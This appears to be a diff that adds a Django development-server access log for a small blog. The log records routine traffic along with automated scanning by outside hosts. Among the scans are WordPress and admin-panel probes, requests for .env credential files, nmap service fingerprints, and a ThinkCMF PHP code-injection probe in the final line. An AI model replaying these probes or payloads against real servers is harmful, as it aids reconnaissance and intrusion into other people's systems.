+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('172.93.102.236', 50518)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /robots.txt
+[18/Jan/2021 00:10:14] "HEAD /robots.txt HTTP/1.0" 404 2242
+[18/Jan/2021 00:11:27] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 00:12:19] "GET / HTTP/1.1" 200 1753
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[18/Jan/2021 00:48:41] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 40826)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[18/Jan/2021 01:18:17] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 01:21:19] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 01:21:19] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 01:21:19] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 01:21:19] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[18/Jan/2021 01:21:19] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 01:21:23] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 01:50:24] "GET /auth/login HTTP/1.0" 200 2473
+Not Found: /manager/html/
+[18/Jan/2021 01:55:14] "GET /manager/html/ HTTP/1.0" 404 2250
+[18/Jan/2021 02:00:00] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 02:00:00] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:00] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[18/Jan/2021 02:00:00] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[18/Jan/2021 02:00:00] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:01] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:01] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:01] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:01] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:01] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:02] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:02] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:02] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:02] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:02] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:03] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /media/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:03] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2310
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:03] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:03] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:03] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:00:04] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[18/Jan/2021 02:02:59] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 02:18:52] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:18:52] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[18/Jan/2021 02:18:53] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[18/Jan/2021 02:18:53] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:18:54] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:18:55] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:18:55] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /site/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:18:56] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:18:56] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+[18/Jan/2021 02:20:37] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/js/jquery/jquery.js
+[18/Jan/2021 02:20:37] "GET /wp-includes/js/jquery/jquery.js HTTP/1.1" 404 2304
+Not Found: /administrator/help/en-GB/toc.json
+[18/Jan/2021 02:20:38] "GET /administrator/help/en-GB/toc.json HTTP/1.1" 404 2310
+Not Found: /administrator/language/en-GB/install.xml
+[18/Jan/2021 02:20:38] "GET /administrator/language/en-GB/install.xml HTTP/1.1" 404 2331
+Not Found: /plugins/system/debug/debug.xml
+[18/Jan/2021 02:20:39] "GET /plugins/system/debug/debug.xml HTTP/1.1" 404 2301
+Not Found: /administrator/
+[18/Jan/2021 02:20:39] "GET /administrator/ HTTP/1.1" 404 2253
+Not Found: /misc/ajax.js
+[18/Jan/2021 02:20:40] "GET /misc/ajax.js HTTP/1.1" 404 2247
+[18/Jan/2021 02:20:40] "GET / HTTP/1.1" 200 1753
+Not Found: /admin/view/javascript/common.js
+[18/Jan/2021 02:20:41] "GET /admin/view/javascript/common.js HTTP/1.1" 404 4052
+Not Found: /admin/includes/general.js
+[18/Jan/2021 02:20:41] "GET /admin/includes/general.js HTTP/1.1" 404 4034
+Not Found: /images/editor/separator.gif
+[18/Jan/2021 02:20:42] "GET /images/editor/separator.gif HTTP/1.1" 404 2292
+Not Found: /js/header-rollup-554.js
+[18/Jan/2021 02:20:43] "GET /js/header-rollup-554.js HTTP/1.1" 404 2280
+Not Found: /vendor/phpunit/phpunit/build.xml
+[18/Jan/2021 02:20:43] "GET /vendor/phpunit/phpunit/build.xml HTTP/1.1" 404 2307
+Not Found: /fckeditor/editor/filemanager/connectors/php/upload.php
+[18/Jan/2021 02:20:44] "GET /fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media HTTP/1.1" 404 2384
+Not Found: /.env
+[18/Jan/2021 02:20:44] "GET /.env HTTP/1.1" 404 2223
+[18/Jan/2021 02:20:45] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 02:31:30] "GET / HTTP/1.0" 200 1753
+[18/Jan/2021 02:31:30] "OPTIONS / HTTP/1.0" 200 1753
+[18/Jan/2021 02:31:31] code 400, message Bad request version ('RTSP/1.0')
+[18/Jan/2021 02:31:31] "OPTIONS / RTSP/1.0" 400 -
+[18/Jan/2021 02:31:37] code 400, message Bad HTTP/0.9 request type ('l\x00')
+[18/Jan/2021 02:31:37] "l          " 400 -
+Not Found: /nice ports,/Trinity.txt.bak
+[18/Jan/2021 02:31:37] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 404 2294
+[18/Jan/2021 02:31:43] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+[18/Jan/2021 02:31:43] "  (rþ          |                    " 400 -
+[18/Jan/2021 02:31:48] code 400, message Bad HTTP/0.9 request type ('\x00')
+[18/Jan/2021 02:31:48] "          versionbind   " 400 -
+[18/Jan/2021 02:31:54] code 400, message Bad HTTP/0.9 request type ('\x00')
+[18/Jan/2021 02:31:54] "            " 400 -
+[18/Jan/2021 02:31:54] code 400, message Bad request syntax ('HELP')
+[18/Jan/2021 02:31:54] "HELP" 400 -
+[18/Jan/2021 02:31:55] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
+[18/Jan/2021 02:31:55] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[18/Jan/2021 02:31:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[18/Jan/2021 02:31:55] "  *%à     Cookie: mstshash=nmap" 400 -
+[18/Jan/2021 02:31:56] code 400, message Bad request version ('\x00/\x00')
+[18/Jan/2021 02:31:56] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[18/Jan/2021 02:31:56] code 400, message Bad request syntax ('\x00\x00\x00qj\x81n0\x81k¡\x03\x02\x01\x05¢\x03\x02\x01')
+[18/Jan/2021 02:31:56] "   qjn0k¡¢" 400 -
+[18/Jan/2021 02:32:02] code 400, message Bad request syntax ('\x00\x00\x00¤ÿSMBr\x00\x00\x00\x00\x08\x01@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x06\x00\x00\x01\x00\x00\x81\x00\x02PC NETWORK PROGRAM 1.0\x00\x02MICROSOFT NETWORKS 1.03\x00\x02MICROSOFT NETWORKS 3.0\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02Samba\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00')
+[18/Jan/2021 02:32:02] "   ¤ÿSMBr    @              @     PC NETWORK PROGRAM 1.0 MICROSOFT NETWORKS 1.03 MICROSOFT NETWORKS 3.0 LANMAN1.0 LM1.2X002 Samba NT LANMAN 1.0 NT LM 0.12 " 400 -
+[18/Jan/2021 02:32:02] code 400, message Bad request syntax ('\x01default')
+[18/Jan/2021 02:32:02] "default" 400 -
+[18/Jan/2021 02:32:03] code 400, message Bad request syntax ('0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00')
+[18/Jan/2021 02:32:03] "0   -c   $ " 400 -
+[18/Jan/2021 02:32:08] code 400, message Bad HTTP/0.9 request type ('0')
+[18/Jan/2021 02:32:08] "0`  " 400 -
+[18/Jan/2021 02:32:09] code 400, message Bad request version ('SIP/2.0')
+[18/Jan/2021 02:32:09] "OPTIONS sip:nm SIP/2.0" 400 -
+[18/Jan/2021 02:32:14] code 400, message Bad request syntax ('TNMP\x04\x00\x00\x00TNME\x00\x00\x04\x00')
+[18/Jan/2021 02:32:14] "TNMP   TNME   " 400 -
+[18/Jan/2021 02:32:19] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00')
+[18/Jan/2021 02:32:19] "  à     " 400 -
+[18/Jan/2021 02:32:25] code 400, message Bad request syntax ('DmdT\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x11\x11\x00ÿ\x01ÿ\x13')
+[18/Jan/2021 02:32:25] "DmdT           ÿÿ" 400 -
+[18/Jan/2021 02:32:30] code 400, message Bad HTTP/0.9 request type (':\x00\x00\x00/\x00\x00\x00\x02\x00\x00@\x02\x0f\x00\x01\x00=\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00@')
+[18/Jan/2021 02:32:30] ":   /     @  =            /         @                 " 400 -
+[18/Jan/2021 02:32:35] code 400, message Bad request syntax ('JRMI\x00\x02K')
+[18/Jan/2021 02:32:35] "JRMI K" 400 -
+[18/Jan/2021 02:32:41] code 400, message Bad request syntax ('\x01\x00\x00ýÎú\x0b°\xa0\x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00ðððð\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
+[18/Jan/2021 02:32:41] "  ýÎú°    MMS                    ðððð    N S P l a y e r / 9 . 0 . 0 . 2 9 8 0 ;   { 0 0 0 0 A A 0 0 - 0 A 0 0 - 0 0 a 0 - A A 0 A - 0 0 0 0 A 0 A A 0 A A 0 }   àmß_" 400 -
+[18/Jan/2021 02:32:46] code 400, message Bad HTTP/0.9 request type ('\x00Z\x00\x00\x01\x00\x00\x00\x016\x01,\x00\x00\x08\x00\x7fÿ\x7f\x08\x00\x00\x00\x01\x00')
+[18/Jan/2021 02:32:46] " Z     6,   ÿ      :                4æ           (CONNECT_DATA=(COMMAND=version))" 400 -
+[18/Jan/2021 02:32:51] code 400, message Bad request version ('\x03\x00(\x00\x04ÿ\x08\x00\x01U\x00\x00\x00MSSQLServer\x00H\x0f\x00\x00')
+[18/Jan/2021 02:32:51] " 4            ( ÿ U   MSSQLServer H  " 400 -
+[18/Jan/2021 02:32:57] code 400, message Bad request syntax ('\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x0f\x00')
+[18/Jan/2021 02:32:57] "              " 400 -
+[18/Jan/2021 02:33:02] code 400, message Bad request syntax ('GIOP\x01\x00\x01\x00$\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00abcdef\x00\x00\x04\x00\x00\x00get\x00\x00\x00\x00\x00')
+[18/Jan/2021 02:33:02] "GIOP  $                abcdef     get     " 400 -
+[18/Jan/2021 02:33:09] code 400, message Bad request version ('\x00/\x00')
+[18/Jan/2021 02:33:09] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[18/Jan/2021 02:33:09] code 400, message Bad HTTP/0.9 request type ('t3')
+[18/Jan/2021 02:33:09] "t3 12.1.2" 400 -
+Not Found: /nmaplowercheck1610904789
+[18/Jan/2021 02:33:10] "GET /nmaplowercheck1610904789 HTTP/1.1" 404 2284
+Not Found: /sdk
+[18/Jan/2021 02:33:10] "POST /sdk HTTP/1.1" 404 2222
+Not Found: /evox/about
+[18/Jan/2021 02:33:10] "GET /evox/about HTTP/1.1" 404 2242
+Not Found: /HNAP1
+[18/Jan/2021 02:33:10] "GET /HNAP1 HTTP/1.1" 404 2227
+[18/Jan/2021 02:33:11] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 02:33:12] code 400, message Bad HTTP/0.9 request type ('\x80\x00\x00("/.\x9e\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86')
+[18/Jan/2021 02:33:12] "  ("/.                                " 400 -
+[18/Jan/2021 02:40:16] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:40:17] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[18/Jan/2021 02:40:18] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[18/Jan/2021 02:40:19] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:40:20] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:40:21] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:40:22] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /site/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:40:23] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[18/Jan/2021 02:40:24] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wp-admin/install.php
+[18/Jan/2021 02:41:39] "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 2278
+[18/Jan/2021 02:41:56] "GET / HTTP/1.1" 200 1753
+Not Found: /robots.txt
+[18/Jan/2021 02:57:04] "GET /robots.txt HTTP/1.1" 404 2241
+[18/Jan/2021 02:57:14] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 02:57:15] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 02:57:15] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[18/Jan/2021 02:57:15] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 02:57:15] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+Not Found: /robots.txt
+[18/Jan/2021 02:57:30] "GET /robots.txt HTTP/1.1" 404 2241
+[18/Jan/2021 03:06:01] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 03:14:54] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 03:14:54] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:14:55] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[18/Jan/2021 03:14:55] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[18/Jan/2021 03:14:56] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:14:56] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:14:57] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:14:57] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:14:58] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:14:58] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:14:59] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:15:00] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:15:00] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:15:01] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:15:01] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:15:02] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /media/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:15:02] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2310
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:15:03] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:15:03] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:15:04] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[18/Jan/2021 03:15:04] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[18/Jan/2021 03:18:26] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 03:49:32] "GET / HTTP/1.1" 200 1753
+Not Found: /robots.txt
+[18/Jan/2021 03:55:11] "GET /robots.txt HTTP/1.1" 404 2241
+[18/Jan/2021 03:55:13] "GET / HTTP/1.1" 200 1753
+Not Found: /login
+[18/Jan/2021 04:50:16] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[18/Jan/2021 04:50:17] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[18/Jan/2021 04:50:17] "GET /manager/html HTTP/1.0" 404 2247
+[18/Jan/2021 04:55:57] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 05:35:43] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 05:35:44] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[18/Jan/2021 05:35:44] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 05:35:44] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 05:35:44] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+Not Found: /config/getuser
+[18/Jan/2021 06:24:24] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[18/Jan/2021 07:21:19] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 07:33:29] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 07:52:05] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 07:52:05] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:05] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[18/Jan/2021 07:52:06] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[18/Jan/2021 07:52:06] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:07] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:07] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:07] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:08] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:08] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:09] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:09] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:09] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:10] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:10] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:11] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /media/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:11] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2310
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:11] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:12] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:12] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[18/Jan/2021 07:52:13] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[18/Jan/2021 08:45:31] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 08:45:31] "GET / HTTP/1.1" 200 1753
+Not Found: /0bef
+[18/Jan/2021 09:16:28] "GET /0bef HTTP/1.0" 404 2223
+Not Found: /.env
+[18/Jan/2021 09:24:23] "GET /.env HTTP/1.1" 404 2224
+Forbidden (CSRF cookie not set.): /
+[18/Jan/2021 09:24:24] "POST / HTTP/1.1" 403 2994
+[18/Jan/2021 10:00:08] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 10:03:51] "GET / HTTP/1.1" 200 1753
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[18/Jan/2021 10:31:49] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 38252)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[18/Jan/2021 10:33:02] "GET / HTTP/1.1" 200 1753
+Not Found: /robots.txt
+[18/Jan/2021 10:33:05] "GET /robots.txt HTTP/1.1" 404 2241
+[18/Jan/2021 10:33:09] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 10:33:14] "GET /auth/signup HTTP/1.1" 200 4174
+Not Found: /config/getuser
+[18/Jan/2021 10:59:43] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[18/Jan/2021 11:05:30] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 11:20:27] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 1753
